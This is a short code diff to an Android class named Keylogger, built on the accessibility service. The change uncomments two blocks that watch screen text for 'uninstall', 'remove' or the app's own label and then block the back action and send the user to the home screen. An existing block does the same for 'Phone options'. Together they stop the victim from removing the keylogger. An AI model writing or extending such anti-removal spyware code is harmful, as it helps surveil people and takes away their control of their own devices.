@@ -246,16 +246,16 @@ public class Keylogger extends AccessibilityService {
 				}
 				
 				
-				// if (lowerCase2.contains("Uninstall".toLowerCase()) || lowerCase2.contains("remove".toLowerCase()) || lowerCase2.contains("uninstall".toLowerCase())) {
-				// 	blockBack();
-				// 	SendMeHome(268435456);
-				// }
+				if (lowerCase2.contains("Uninstall".toLowerCase()) || lowerCase2.contains("remove".toLowerCase()) || lowerCase2.contains("uninstall".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
 				
 				
-				// if (lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()) && lowerCase2.contains("uninstall".toLowerCase())) {
-				// 	blockBack();
-				// 	SendMeHome(268435456);
-				// }
+				if (lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()) && lowerCase2.contains("uninstall".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
 				if (lowerCase2.contains("Phone options".toLowerCase())) {
 					blockBack();
 					SendMeHome(268435456);
